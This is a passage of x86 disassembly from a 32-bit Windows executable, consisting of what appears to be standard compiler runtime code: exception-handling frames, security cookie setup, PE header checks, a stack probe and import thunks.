  407a78:	sub    esp,0x8
  407a7b:	push   ebx
  407a7c:	push   esi
  407a7d:	push   edi
  407a7e:	mov    eax,ds:0x409004
  407a83:	xor    DWORD PTR [ebp-0x8],eax
  407a86:	xor    eax,ebp
  407a88:	push   eax
  407a89:	lea    eax,[ebp-0x10]
  407a8c:	mov    fs:0x0,eax
  407a92:	mov    DWORD PTR [ebp-0x18],esp
  407a95:	mov    DWORD PTR [ebp-0x4],0x0
  407a9c:	push   0x400000
  407aa1:	call   0x407b30
  407aa6:	add    esp,0x4
  407aa9:	test   eax,eax
  407aab:	je     0x407b01
  407aad:	mov    eax,DWORD PTR [ebp+0x8]
  407ab0:	sub    eax,0x400000
  407ab5:	push   eax
  407ab6:	push   0x400000
  407abb:	call   0x407a10
  407ac0:	add    esp,0x8
  407ac3:	test   eax,eax
  407ac5:	je     0x407b01
  407ac7:	mov    eax,DWORD PTR [eax+0x24]
  407aca:	shr    eax,0x1f
  407acd:	not    eax
  407acf:	and    eax,0x1
  407ad2:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407ad9:	mov    ecx,DWORD PTR [ebp-0x10]
  407adc:	mov    DWORD PTR fs:0x0,ecx
  407ae3:	pop    ecx
  407ae4:	pop    edi
  407ae5:	pop    esi
  407ae6:	pop    ebx
  407ae7:	mov    esp,ebp
  407ae9:	pop    ebp
  407aea:	ret    
  407aeb:	mov    eax,DWORD PTR [ebp-0x14]
  407aee:	mov    eax,DWORD PTR [eax]
  407af0:	xor    ecx,ecx
  407af2:	cmp    DWORD PTR [eax],0xc0000005
  407af8:	sete   cl
  407afb:	mov    eax,ecx
  407afd:	ret    
  407afe:	mov    esp,DWORD PTR [ebp-0x18]
  407b01:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407b08:	xor    eax,eax
  407b0a:	mov    ecx,DWORD PTR [ebp-0x10]
  407b0d:	mov    DWORD PTR fs:0x0,ecx
  407b14:	pop    ecx
  407b15:	pop    edi
  407b16:	pop    esi
  407b17:	pop    ebx
  407b18:	mov    esp,ebp
  407b1a:	pop    ebp
  407b1b:	ret    
  407b1c:	int3   
  407b1d:	int3   
  407b1e:	int3   
  407b1f:	int3   
  407b20:	int3   
  407b21:	int3   
  407b22:	int3   
  407b23:	int3   
  407b24:	int3   
  407b25:	int3   
  407b26:	int3   
  407b27:	int3   
  407b28:	int3   
  407b29:	int3   
  407b2a:	int3   
  407b2b:	int3   
  407b2c:	int3   
  407b2d:	int3   
  407b2e:	int3   
  407b2f:	int3   
  407b30:	mov    edi,edi
  407b32:	push   ebp
  407b33:	mov    ebp,esp
  407b35:	mov    eax,DWORD PTR [ebp+0x8]
  407b38:	mov    ecx,0x5a4d
  407b3d:	cmp    WORD PTR [eax],cx
  407b40:	je     0x407b46
  407b42:	xor    eax,eax
  407b44:	pop    ebp
  407b45:	ret    
  407b46:	mov    ecx,DWORD PTR [eax+0x3c]
  407b49:	add    ecx,eax
  407b4b:	xor    eax,eax
  407b4d:	cmp    DWORD PTR [ecx],0x4550
  407b53:	jne    0x407b61
  407b55:	mov    edx,0x10b
  407b5a:	cmp    WORD PTR [ecx+0x18],dx
  407b5e:	sete   al
  407b61:	pop    ebp
  407b62:	ret    
  407b63:	int3   
  407b64:	int3   
  407b65:	int3   
  407b66:	int3   
  407b67:	int3   
  407b68:	mov    edi,edi
  407b6a:	push   ebp
  407b6b:	mov    ebp,esp
  407b6d:	sub    esp,0x14
  407b70:	and    DWORD PTR [ebp-0xc],0x0
  407b74:	and    DWORD PTR [ebp-0x8],0x0
  407b78:	mov    eax,ds:0x409004
  407b7d:	push   esi
  407b7e:	push   edi
  407b7f:	mov    edi,0xbb40e64e
  407b84:	mov    esi,0xffff0000
  407b89:	cmp    eax,edi
  407b8b:	je     0x407b9a
  407b8d:	test   esi,eax
  407b8f:	je     0x407b9a
  407b91:	not    eax
  407b93:	mov    ds:0x409008,eax
  407b98:	jmp    0x407c04
  407b9a:	lea    eax,[ebp-0xc]
  407b9d:	push   eax
  407b9e:	call   DWORD PTR ds:0x40a0e8
  407ba4:	mov    eax,DWORD PTR [ebp-0x8]
  407ba7:	xor    eax,DWORD PTR [ebp-0xc]
  407baa:	mov    DWORD PTR [ebp-0x4],eax
  407bad:	call   DWORD PTR ds:0x40a0e4
  407bb3:	xor    DWORD PTR [ebp-0x4],eax
  407bb6:	call   DWORD PTR ds:0x40a054
  407bbc:	xor    DWORD PTR [ebp-0x4],eax
  407bbf:	call   DWORD PTR ds:0x40a0ec
  407bc5:	xor    eax,DWORD PTR [ebp-0x4]
  407bc8:	lea    ecx,[ebp-0x4]
  407bcb:	xor    eax,ecx
  407bcd:	mov    DWORD PTR [ebp-0x4],eax
  407bd0:	lea    eax,[ebp-0x14]
  407bd3:	push   eax
  407bd4:	call   DWORD PTR ds:0x40a0e0
  407bda:	mov    eax,DWORD PTR [ebp-0x10]
  407bdd:	xor    eax,DWORD PTR [ebp-0x14]
  407be0:	mov    ecx,DWORD PTR [ebp-0x4]
  407be3:	xor    ecx,eax
  407be5:	cmp    ecx,edi
  407be7:	je     0x407bf1
  407be9:	test   DWORD PTR ds:0x409004,esi
  407bef:	jne    0x407bf6
  407bf1:	mov    ecx,0xbb40e64f
  407bf6:	mov    DWORD PTR ds:0x409004,ecx
  407bfc:	not    ecx
  407bfe:	mov    DWORD PTR ds:0x409008,ecx
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	mov    esp,ebp
  407c08:	pop    ebp
  407c09:	ret    
  407c0a:	int3   
  407c0b:	int3   
  407c0c:	int3   
  407c0d:	int3   
  407c0e:	int3   
  407c0f:	push   0x30000
  407c14:	push   0x10000
  407c19:	call   DWORD PTR ds:0x40a16c
  407c1f:	pop    ecx
  407c20:	pop    ecx
  407c21:	ret    
  407c22:	int3   
  407c23:	int3   
  407c24:	int3   
  407c25:	int3   
  407c26:	int3   
  407c27:	int3   
  407c28:	jmp    DWORD PTR ds:0x40a174
  407c2e:	int3   
  407c2f:	int3   
  407c30:	int3   
  407c31:	int3   
  407c32:	int3   
  407c33:	int3   
  407c34:	push   0x407c90
  407c39:	push   DWORD PTR fs:0x0
  407c40:	mov    eax,DWORD PTR [esp+0x10]
  407c44:	mov    DWORD PTR [esp+0x10],ebp
  407c48:	lea    ebp,[esp+0x10]
  407c4c:	sub    esp,eax
  407c4e:	push   ebx
  407c4f:	push   esi
  407c50:	push   edi
  407c51:	mov    eax,ds:0x409004
  407c56:	xor    DWORD PTR [ebp-0x4],eax
  407c59:	xor    eax,ebp
  407c5b:	mov    DWORD PTR [ebp-0x1c],eax
  407c5e:	push   eax
  407c5f:	mov    DWORD PTR [ebp-0x18],esp
  407c62:	push   DWORD PTR [ebp-0x8]
  407c65:	mov    eax,DWORD PTR [ebp-0x4]
  407c68:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407c6f:	mov    DWORD PTR [ebp-0x8],eax
  407c72:	lea    eax,[ebp-0x10]
  407c75:	mov    fs:0x0,eax
  407c7b:	ret    
  407c7c:	mov    ecx,DWORD PTR [ebp-0x1c]
  407c7f:	xor    ecx,ebp
  407c81:	call   0x407750
  407c86:	jmp    0x407db9
  407c8b:	int3   
  407c8c:	int3   
  407c8d:	int3   
  407c8e:	int3   
  407c8f:	int3   
  407c90:	mov    edi,edi
  407c92:	push   ebp
  407c93:	mov    ebp,esp
  407c95:	push   DWORD PTR [ebp+0x14]
  407c98:	push   DWORD PTR [ebp+0x10]
  407c9b:	push   DWORD PTR [ebp+0xc]
  407c9e:	push   DWORD PTR [ebp+0x8]
  407ca1:	push   0x407750
  407ca6:	push   0x409004
  407cab:	call   0x407dd2
  407cb0:	add    esp,0x18
  407cb3:	pop    ebp
  407cb4:	ret    
  407cb5:	int3   
  407cb6:	int3   
  407cb7:	int3   
  407cb8:	int3   
  407cb9:	int3   
  407cba:	push   0x18
  407cbc:	push   0x408d78
  407cc1:	call   0x407c34
  407cc6:	and    DWORD PTR [ebp-0x28],0x0
  407cca:	mov    eax,ds:0x409810
  407ccf:	mov    DWORD PTR [ebp-0x20],eax
  407cd2:	cmp    eax,0xffffffff
  407cd5:	jne    0x407ced
  407cd7:	push   DWORD PTR [ebp+0x8]
  407cda:	mov    esi,DWORD PTR ds:0x40a1b4
  407ce0:	mov    ecx,esi
  407ce2:	call   DWORD PTR ds:0x40a20c
  407ce8:	call   esi
  407cea:	pop    ecx
  407ceb:	jmp    0x407d41
  407ced:	push   0x8
  407cef:	call   0x407dde
  407cf4:	pop    ecx
  407cf5:	and    DWORD PTR [ebp-0x4],0x0
  407cf9:	mov    eax,ds:0x409810
  407cfe:	mov    DWORD PTR [ebp-0x20],eax
  407d01:	mov    eax,ds:0x40980c
  407d06:	mov    DWORD PTR [ebp-0x24],eax
  407d09:	lea    eax,[ebp-0x24]
  407d0c:	push   eax
  407d0d:	lea    eax,[ebp-0x20]
  407d10:	push   eax
  407d11:	push   DWORD PTR [ebp+0x8]
  407d14:	call   0x407df6
  407d19:	add    esp,0xc
  407d1c:	mov    esi,eax
  407d1e:	mov    DWORD PTR [ebp-0x28],esi
  407d21:	mov    ecx,DWORD PTR [ebp-0x20]
  407d24:	mov    DWORD PTR ds:0x409810,ecx
  407d2a:	mov    ecx,DWORD PTR [ebp-0x24]
  407d2d:	mov    DWORD PTR ds:0x40980c,ecx
  407d33:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407d3a:	call   0x407d4a
  407d3f:	mov    eax,esi
  407d41:	call   0x407c7c
  407d46:	ret    
  407d47:	mov    esi,DWORD PTR [ebp-0x28]
  407d4a:	push   0x8
  407d4c:	call   0x407dea
  407d51:	pop    ecx
  407d52:	ret    
  407d53:	int3   
  407d54:	int3   
  407d55:	int3   
  407d56:	int3   
  407d57:	int3   
  407d58:	mov    edi,edi
  407d5a:	push   ebp
  407d5b:	mov    ebp,esp
  407d5d:	push   DWORD PTR [ebp+0x8]
  407d60:	call   0x407cba
  407d65:	neg    eax
  407d67:	pop    ecx
  407d68:	sbb    eax,eax
  407d6a:	neg    eax
  407d6c:	dec    eax
  407d6d:	pop    ebp
  407d6e:	ret    
  407d6f:	int3   
  407d70:	int3   
  407d71:	int3   
  407d72:	int3   
  407d73:	int3   
  407d74:	push   0x407c90
  407d79:	push   DWORD PTR fs:0x0
  407d80:	mov    eax,DWORD PTR [esp+0x10]
  407d84:	mov    DWORD PTR [esp+0x10],ebp
  407d88:	lea    ebp,[esp+0x10]
  407d8c:	sub    esp,eax
  407d8e:	push   ebx
  407d8f:	push   esi
  407d90:	push   edi
  407d91:	mov    eax,ds:0x409004
  407d96:	xor    DWORD PTR [ebp-0x4],eax
  407d99:	xor    eax,ebp
  407d9b:	push   eax
  407d9c:	mov    DWORD PTR [ebp-0x18],esp
  407d9f:	push   DWORD PTR [ebp-0x8]
  407da2:	mov    eax,DWORD PTR [ebp-0x4]
  407da5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407dac:	mov    DWORD PTR [ebp-0x8],eax
  407daf:	lea    eax,[ebp-0x10]
  407db2:	mov    fs:0x0,eax
  407db8:	ret    
  407db9:	mov    ecx,DWORD PTR [ebp-0x10]
  407dbc:	mov    DWORD PTR fs:0x0,ecx
  407dc3:	pop    ecx
  407dc4:	pop    edi
  407dc5:	pop    edi
  407dc6:	pop    esi
  407dc7:	pop    ebx
  407dc8:	mov    esp,ebp
  407dca:	pop    ebp
  407dcb:	push   ecx
  407dcc:	ret    
  407dcd:	int3   
  407dce:	int3   
  407dcf:	int3   
  407dd0:	int3   
  407dd1:	int3   
  407dd2:	jmp    DWORD PTR ds:0x40a190
  407dd8:	int3   
  407dd9:	int3   
  407dda:	int3   
  407ddb:	int3   
  407ddc:	int3   
  407ddd:	int3   
  407dde:	jmp    DWORD PTR ds:0x40a1a8
  407de4:	int3   
  407de5:	int3   
  407de6:	int3   
  407de7:	int3   
  407de8:	int3   
  407de9:	int3   
  407dea:	jmp    DWORD PTR ds:0x40a1ac
  407df0:	int3   
  407df1:	int3   
  407df2:	int3   
  407df3:	int3   
  407df4:	int3   
  407df5:	int3   
  407df6:	jmp    DWORD PTR ds:0x40a1b0
  407dfc:	int3   
  407dfd:	int3   
  407dfe:	int3   
  407dff:	int3   
  407e00:	int3   
  407e01:	mov    edi,edi
  407e03:	push   ebp
  407e04:	mov    ebp,esp
  407e06:	push   esi
  407e07:	jmp    0x407e16
  407e09:	push   DWORD PTR [ebp+0x8]
  407e0c:	call   0x407e78
  407e11:	pop    ecx
  407e12:	test   eax,eax
  407e14:	je     0x407e25
  407e16:	push   DWORD PTR [ebp+0x8]
  407e19:	call   0x407772
  407e1e:	mov    esi,eax
  407e20:	pop    ecx
  407e21:	test   esi,esi
  407e23:	je     0x407e09
  407e25:	mov    eax,esi
  407e27:	pop    esi
  407e28:	pop    ebp
  407e29:	ret    
  407e2a:	int3   
  407e2b:	int3   
  407e2c:	int3   
  407e2d:	int3   
  407e2e:	int3   
  407e2f:	mov    edi,edi
  407e31:	push   ebp
  407e32:	mov    ebp,esp
  407e34:	pop    ebp
  407e35:	jmp    0x407e01
  407e3a:	int3   
  407e3b:	int3   
  407e3c:	int3   
  407e3d:	int3   
  407e3e:	int3   
  407e3f:	jmp    0x407458
  407e44:	int3   
  407e45:	int3   
  407e46:	int3   
  407e47:	int3   
  407e48:	int3   
  407e49:	int3   
  407e4a:	int3   
  407e4b:	int3   
  407e4c:	int3   
  407e4d:	int3   
  407e4e:	int3   
  407e4f:	int3   
  407e50:	mov    edi,edi
  407e52:	push   ebp
  407e53:	mov    ebp,esp
  407e55:	push   esi
  407e56:	mov    esi,ecx
  407e58:	call   DWORD PTR ds:0x40a1a4
  407e5e:	test   BYTE PTR [ebp+0x8],0x1
  407e62:	je     0x407e6b
  407e64:	push   esi
  407e65:	call   0x407458
  407e6a:	pop    ecx
  407e6b:	mov    eax,esi
  407e6d:	pop    esi
  407e6e:	pop    ebp
  407e6f:	ret    0x4
  407e72:	int3   
  407e73:	int3   
  407e74:	int3   
  407e75:	int3   
  407e76:	int3   
  407e77:	int3   
  407e78:	jmp    DWORD PTR ds:0x40a19c
  407e7e:	int3   
  407e7f:	int3   
  407e80:	int3   
  407e81:	int3   
  407e82:	int3   
  407e83:	int3   
  407e84:	jmp    DWORD PTR ds:0x40a1a0
  407e8a:	int3   
  407e8b:	int3   
  407e8c:	int3   
  407e8d:	int3   
  407e8e:	int3   
  407e8f:	int3   
  407e90:	jmp    DWORD PTR ds:0x40a1f0
  407e96:	int3   
  407e97:	int3   
  407e98:	int3   
  407e99:	int3   
  407e9a:	int3   
  407e9b:	mov    ecx,DWORD PTR [ebp-0xc]
  407e9e:	mov    DWORD PTR fs:0x0,ecx
  407ea5:	pop    ecx
  407ea6:	pop    edi
  407ea7:	pop    edi
  407ea8:	pop    esi
  407ea9:	pop    ebx
  407eaa:	mov    esp,ebp
  407eac:	pop    ebp
  407ead:	push   ecx
  407eae:	ret    
  407eaf:	int3   
  407eb0:	int3   
  407eb1:	int3   
  407eb2:	int3   
  407eb3:	int3   
  407eb4:	mov    ecx,DWORD PTR [ebp-0x10]
  407eb7:	xor    ecx,ebp
  407eb9:	call   0x407750
  407ebe:	jmp    0x407e9b
  407ec3:	int3   
  407ec4:	int3   
  407ec5:	int3   
  407ec6:	int3   
  407ec7:	int3   
  407ec8:	mov    ecx,DWORD PTR [ebp-0x14]
  407ecb:	xor    ecx,ebp
  407ecd:	call   0x407750
  407ed2:	jmp    0x407e9b
  407ed7:	int3   
  407ed8:	int3   
  407ed9:	int3   
  407eda:	int3   
  407edb:	int3   
  407edc:	push   eax
  407edd:	push   DWORD PTR fs:0x0
  407ee4:	lea    eax,[esp+0xc]
  407ee8:	sub    esp,DWORD PTR [esp+0xc]
  407eec:	push   ebx
  407eed:	push   esi
  407eee:	push   edi
  407eef:	mov    DWORD PTR [eax],ebp
  407ef1:	mov    ebp,eax
  407ef3:	mov    eax,ds:0x409004
  407ef8:	xor    eax,ebp
  407efa:	push   eax
  407efb:	push   DWORD PTR [ebp-0x4]
  407efe:	mov    DWORD PTR [ebp-0x4],0xffffffff
  407f05:	lea    eax,[ebp-0xc]
  407f08:	mov    fs:0x0,eax
  407f0e:	ret    
  407f0f:	int3   
  407f10:	int3   
  407f11:	int3   
  407f12:	int3   
  407f13:	int3   
  407f14:	push   eax
  407f15:	push   DWORD PTR fs:0x0
  407f1c:	lea    eax,[esp+0xc]
  407f20:	sub    esp,DWORD PTR [esp+0xc]
  407f24:	push   ebx
  407f25:	push   esi
  407f26:	push   edi
  407f27:	mov    DWORD PTR [eax],ebp
  407f29:	mov    ebp,eax
  407f2b:	mov    eax,ds:0x409004
  407f30:	xor    eax,ebp
  407f32:	push   eax
  407f33:	mov    DWORD PTR [ebp-0x10],eax
  407f36:	push   DWORD PTR [ebp-0x4]
  407f39:	mov    DWORD PTR [ebp-0x4],0xffffffff
  407f40:	lea    eax,[ebp-0xc]
  407f43:	mov    fs:0x0,eax
  407f49:	ret    
  407f4a:	int3   
  407f4b:	int3   
  407f4c:	int3   
  407f4d:	int3   
  407f4e:	int3   
  407f4f:	push   eax
  407f50:	push   DWORD PTR fs:0x0
  407f57:	lea    eax,[esp+0xc]
  407f5b:	sub    esp,DWORD PTR [esp+0xc]
  407f5f:	push   ebx
  407f60:	push   esi
  407f61:	push   edi
  407f62:	mov    DWORD PTR [eax],ebp
  407f64:	mov    ebp,eax
  407f66:	mov    eax,ds:0x409004
  407f6b:	xor    eax,ebp
  407f6d:	push   eax
  407f6e:	mov    DWORD PTR [ebp-0x10],esp
  407f71:	push   DWORD PTR [ebp-0x4]
  407f74:	mov    DWORD PTR [ebp-0x4],0xffffffff
  407f7b:	lea    eax,[ebp-0xc]
  407f7e:	mov    fs:0x0,eax
  407f84:	ret    
  407f85:	int3   
  407f86:	int3   
  407f87:	int3   
  407f88:	int3   
  407f89:	int3   
  407f8a:	push   eax
  407f8b:	push   DWORD PTR fs:0x0
  407f92:	lea    eax,[esp+0xc]
  407f96:	sub    esp,DWORD PTR [esp+0xc]
  407f9a:	push   ebx
  407f9b:	push   esi
  407f9c:	push   edi
  407f9d:	mov    DWORD PTR [eax],ebp
  407f9f:	mov    ebp,eax
  407fa1:	mov    eax,ds:0x409004
  407fa6:	xor    eax,ebp
  407fa8:	push   eax
  407fa9:	mov    DWORD PTR [ebp-0x14],eax
  407fac:	mov    DWORD PTR [ebp-0x10],esp
  407faf:	push   DWORD PTR [ebp-0x4]
  407fb2:	mov    DWORD PTR [ebp-0x4],0xffffffff
  407fb9:	lea    eax,[ebp-0xc]
  407fbc:	mov    fs:0x0,eax
  407fc2:	ret    
  407fc3:	int3   
  407fc4:	int3   
  407fc5:	int3   
  407fc6:	int3   
  407fc7:	int3   
  407fc8:	jmp    DWORD PTR ds:0x40a1f8
  407fce:	int3   
  407fcf:	int3   
  407fd0:	int3   
  407fd1:	int3   
  407fd2:	int3   
  407fd3:	int3   
  407fd4:	int3   
  407fd5:	int3   
  407fd6:	int3   
  407fd7:	int3   
  407fd8:	int3   
  407fd9:	int3   
  407fda:	int3   
  407fdb:	int3   
  407fdc:	int3   
  407fdd:	int3   
  407fde:	int3   
  407fdf:	int3   
  407fe0:	push   ecx
  407fe1:	lea    ecx,[esp+0x4]
  407fe5:	sub    ecx,eax
  407fe7:	sbb    eax,eax
  407fe9:	not    eax
  407feb:	and    ecx,eax
  407fed:	mov    eax,esp
  407fef:	and    eax,0xfffff000
  407ff4:	cmp    ecx,eax
  407ff6:	jb     0x408002
  407ff8:	mov    eax,ecx
  407ffa:	pop    ecx
  407ffb:	xchg   esp,eax
  407ffc:	mov    eax,DWORD PTR [eax]
  407ffe:	mov    DWORD PTR [esp],eax
  408001:	ret    
  408002:	sub    eax,0x1000
  408007:	test   DWORD PTR [eax],eax
  408009:	jmp    0x407ff4
  40800b:	int3   
  40800c:	int3   
  40800d:	int3   
  40800e:	int3   
  40800f:	int3   
  408010:	lea    ecx,[ebp-0x14]
  408013:	jmp    0x40321c
  408018:	lea    ecx,[ebp-0x24]
  40801b:	jmp    0x402145
  408020:	push   DWORD PTR [ebp-0x18]
  408023:	call   0x407458
  408028:	pop    ecx
  408029:	ret    
  40802a:	lea    ecx,[ebp-0x18]
  40802d:	jmp    0x4032ff
  408032:	mov    edx,DWORD PTR [esp+0x8]
  408036:	lea    eax,[edx+0xc]
  408039:	mov    ecx,DWORD PTR [edx-0x2c]
  40803c:	xor    ecx,eax
  40803e:	call   0x407750
  408043:	mov    eax,0x408680
  408048:	jmp    0x407fc8
  40804d:	int3   
  40804e:	int3   
  40804f:	int3   
  408050:	int3   
  408051:	int3   
  408052:	mov    ecx,DWORD PTR [ebp-0x10]
  408055:	jmp    0x40321c
  40805a:	mov    ecx,DWORD PTR [ebp-0x10]
  40805d:	add    ecx,0x4
  408060:	jmp    0x40321c
  408065:	mov    ecx,DWORD PTR [ebp-0x10]
  408068:	add    ecx,0x8
  40806b:	jmp    0x40321c
  408070:	mov    ecx,DWORD PTR [ebp-0x10]
  408073:	add    ecx,0xc
  408076:	jmp    0x40321c
  40807b:	mov    ecx,DWORD PTR [ebp-0x10]
  40807e:	add    ecx,0x10
  408081:	jmp    0x40321c
  408086:	mov    ecx,DWORD PTR [ebp-0x10]
  408089:	add    ecx,0x14
  40808c:	jmp    0x40321c
  408091:	mov    ecx,DWORD PTR [ebp-0x10]
  408094:	add    ecx,0x18
  408097:	jmp    0x40321c
  40809c:	mov    ecx,DWORD PTR [ebp-0x10]
  40809f:	add    ecx,0x1c
  4080a2:	jmp    0x40321c
  4080a7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080aa:	add    ecx,0x28
  4080ad:	jmp    0x40321c
  4080b2:	mov    edx,DWORD PTR [esp+0x8]
  4080b6:	lea    eax,[edx+0xc]
  4080b9:	mov    ecx,DWORD PTR [edx-0x14]
  4080bc:	xor    ecx,eax
  4080be:	call   0x407750
  4080c3:	mov    eax,0x4086f8
  4080c8:	jmp    0x407fc8
  4080cd:	int3   
  4080ce:	int3   
  4080cf:	int3   
  4080d0:	int3   
  4080d1:	int3   
  4080d2:	mov    edx,DWORD PTR [esp+0x8]
  4080d6:	lea    eax,[edx+0xc]
  4080d9:	mov    ecx,DWORD PTR [edx-0x844]
  4080df:	xor    ecx,eax
  4080e1:	call   0x407750
  4080e6:	mov    ecx,DWORD PTR [edx-0x8]
  4080e9:	xor    ecx,eax
  4080eb:	call   0x407750
  4080f0:	mov    eax,0x408768
  4080f5:	jmp    0x407fc8
  4080fa:	int3   
  4080fb:	int3   
  4080fc:	int3   
  4080fd:	int3   
  4080fe:	int3   
  4080ff:	lea    ecx,[ebp-0x1c]
  408102:	jmp    0x40321c
  408107:	lea    ecx,[ebp-0x1c]
  40810a:	jmp    0x40321c
  40810f:	mov    edx,DWORD PTR [esp+0x8]
  408113:	lea    eax,[edx-0x24]
  408116:	mov    ecx,DWORD PTR [edx-0x28]
  408119:	xor    ecx,eax
  40811b:	call   0x407750
  408120:	mov    eax,0x408828
  408125:	jmp    0x407fc8
  40812a:	int3   
  40812b:	int3   
  40812c:	int3   
  40812d:	int3   
  40812e:	int3   
  40812f:	lea    ecx,[ebp-0x820]
  408135:	jmp    0x402145
  40813a:	lea    ecx,[ebp-0x814]
  408140:	jmp    0x40321c
  408145:	mov    edx,DWORD PTR [esp+0x8]
  408149:	lea    eax,[edx+0xc]
  40814c:	mov    ecx,DWORD PTR [edx-0x824]
  408152:	xor    ecx,eax
  408154:	call   0x407750
  408159:	mov    ecx,DWORD PTR [edx-0x4]
  40815c:	xor    ecx,eax
  40815e:	call   0x407750
  408163:	mov    eax,0x40885c
  408168:	jmp    0x407fc8
  40816d:	int3   
  40816e:	int3   
  40816f:	int3   
  408170:	int3   
  408171:	int3   
  408172:	lea    ecx,[ebp-0x2030]
  408178:	jmp    0x402145
  40817d:	lea    ecx,[ebp-0x2044]
  408183:	jmp    0x402145
  408188:	lea    ecx,[ebp-0x2038]
  40818e:	jmp    0x40321c
  408193:	lea    ecx,[ebp-0x2024]
  408199:	jmp    0x402145
  40819e:	lea    ecx,[ebp-0x2018]
  4081a4:	jmp    0x40321c
  4081a9:	lea    ecx,[ebp-0x2014]
  4081af:	jmp    0x40321c
  4081b4:	lea    ecx,[ebp-0x2034]
  4081ba:	jmp    0x40321c
  4081bf:	mov    edx,DWORD PTR [esp+0x8]
  4081c3:	lea    eax,[edx+0xc]
  4081c6:	mov    ecx,DWORD PTR [edx-0x204c]
  4081cc:	xor    ecx,eax
  4081ce:	call   0x407750
  4081d3:	mov    ecx,DWORD PTR [edx-0x4]
  4081d6:	xor    ecx,eax
  4081d8:	call   0x407750
  4081dd:	mov    eax,0x408890
  4081e2:	jmp    0x407fc8
  4081e7:	int3   
  4081e8:	int3   
  4081e9:	int3   
  4081ea:	int3   
  4081eb:	int3   
  4081ec:	lea    ecx,[ebp-0x24]
  4081ef:	jmp    0x406edc
  4081f4:	lea    ecx,[ebp-0x30]
  4081f7:	jmp    0x402145
  4081fc:	lea    ecx,[ebp-0x18]
  4081ff:	jmp    0x40321c
  408204:	lea    ecx,[ebp-0x18]
  408207:	jmp    0x40321c
  40820c:	mov    eax,DWORD PTR [ebp-0x1c]
  40820f:	and    eax,0x1
  408212:	je     0x408224
  408218:	and    DWORD PTR [ebp-0x1c],0xfffffffe
  40821c:	lea    ecx,[ebp-0x18]
  40821f:	jmp    0x40321c
  408224:	ret    
  408225:	lea    ecx,[ebp-0x14]
  408228:	jmp    0x40321c
  40822d:	mov    edx,DWORD PTR [esp+0x8]
  408231:	lea    eax,[edx+0xc]
  408234:	mov    ecx,DWORD PTR [edx-0x34]
  408237:	xor    ecx,eax
  408239:	call   0x407750
  40823e:	mov    eax,0x4088ec
  408243:	jmp    0x407fc8
  408248:	int3   
  408249:	int3   
  40824a:	int3   
  40824b:	int3   
  40824c:	int3   
  40824d:	lea    ecx,[ebp-0x10]
  408250:	jmp    0x40321c
  408255:	lea    ecx,[ebp-0x14]
  408258:	jmp    0x40321c
  40825d:	lea    ecx,[ebp-0x30]
  408260:	jmp    0x402145
  408265:	lea    ecx,[ebp-0x24]
  408268:	jmp    0x40321c
  40826d:	mov    edx,DWORD PTR [esp+0x8]
  408271:	lea    eax,[edx+0xc]
  408274:	mov    ecx,DWORD PTR [edx-0x34]
  408277:	xor    ecx,eax
  408279:	call   0x407750
  40827e:	mov    eax,0x408940
  408283:	jmp    0x407fc8
  408288:	int3   
  408289:	int3   
  40828a:	int3   
  40828b:	int3   
  40828c:	int3   
  40828d:	lea    ecx,[ebp-0x228]
  408293:	jmp    0x406edc
  408298:	lea    ecx,[ebp-0x218]
  40829e:	jmp    0x4023c8
  4082a3:	mov    edx,DWORD PTR [esp+0x8]
  4082a7:	lea    eax,[edx+0xc]
  4082aa:	mov    ecx,DWORD PTR [edx-0x230]
  4082b0:	xor    ecx,eax
  4082b2:	call   0x407750
  4082b7:	mov    ecx,DWORD PTR [edx-0x4]
  4082ba:	xor    ecx,eax
  4082bc:	call   0x407750
  4082c1:	mov    eax,0x408984
  4082c6:	jmp    0x407fc8
  4082cb:	int3   
  4082cc:	int3   
  4082cd:	int3   
  4082ce:	int3   
  4082cf:	int3   
  4082d0:	lea    ecx,[ebp-0x14]
  4082d3:	jmp    0x4023c8
  4082d8:	lea    ecx,[ebp-0x18]
  4082db:	jmp    0x4023c8
  4082e0:	mov    edx,DWORD PTR [esp+0x8]
  4082e4:	lea    eax,[edx+0xc]
  4082e7:	mov    ecx,DWORD PTR [edx-0x80]
  4082ea:	xor    ecx,eax
  4082ec:	call   0x407750
  4082f1:	mov    eax,0x4089b8
  4082f6:	jmp    0x407fc8
  4082fb:	int3   
  4082fc:	int3   
  4082fd:	int3   
  4082fe:	int3   
  4082ff:	int3   
  408300:	mov    eax,DWORD PTR [ebp-0x30]
  408303:	and    eax,0x1
  408306:	je     0x408318
  40830c:	and    DWORD PTR [ebp-0x30],0xfffffffe
  408310:	mov    ecx,DWORD PTR [ebp-0x34]
  408313:	jmp    0x40321c
  408318:	ret    
  408319:	mov    edx,DWORD PTR [esp+0x8]
  40831d:	lea    eax,[edx+0xc]
  408320:	mov    ecx,DWORD PTR [edx-0x38]
  408323:	xor    ecx,eax
  408325:	call   0x407750
  40832a:	mov    ecx,DWORD PTR [edx-0x4]
  40832d:	xor    ecx,eax
  40832f:	call   0x407750
  408334:	mov    eax,0x4089ec
  408339:	jmp    0x407fc8
  40833e:	int3   
  40833f:	int3   
  408340:	int3   
  408341:	int3   
  408342:	int3   
  408343:	lea    ecx,[ebp-0x1c]
  408346:	jmp    0x406edc
  40834b:	lea    ecx,[ebp-0x28]
  40834e:	jmp    0x402145
  408353:	lea    ecx,[ebp-0x10]
  408356:	jmp    0x40321c
  40835b:	lea    ecx,[ebp-0x14]
  40835e:	jmp    0x40321c
  408363:	lea    ecx,[ebp-0x14]
  408366:	jmp    0x40321c
  40836b:	lea    ecx,[ebp-0x14]
  40836e:	jmp    0x40321c
  408373:	mov    edx,DWORD PTR [esp+0x8]
  408377:	lea    eax,[edx+0xc]
  40837a:	mov    ecx,DWORD PTR [edx-0x2c]
  40837d:	xor    ecx,eax
  40837f:	call   0x407750
  408384:	mov    eax,0x408a18
  408389:	jmp    0x407fc8
  40838e:	int3   
  40838f:	int3   
  408390:	int3   
  408391:	int3   
  408392:	int3   
  408393:	lea    ecx,[ebp-0x14]
  408396:	jmp    0x40321c
  40839b:	mov    edx,DWORD PTR [esp+0x8]
  40839f:	lea    eax,[edx+0xc]
  4083a2:	mov    ecx,DWORD PTR [edx-0x18]
  4083a5:	xor    ecx,eax
  4083a7:	call   0x407750
  4083ac:	mov    eax,0x408a6c
  4083b1:	jmp    0x407fc8
  4083b6:	int3   
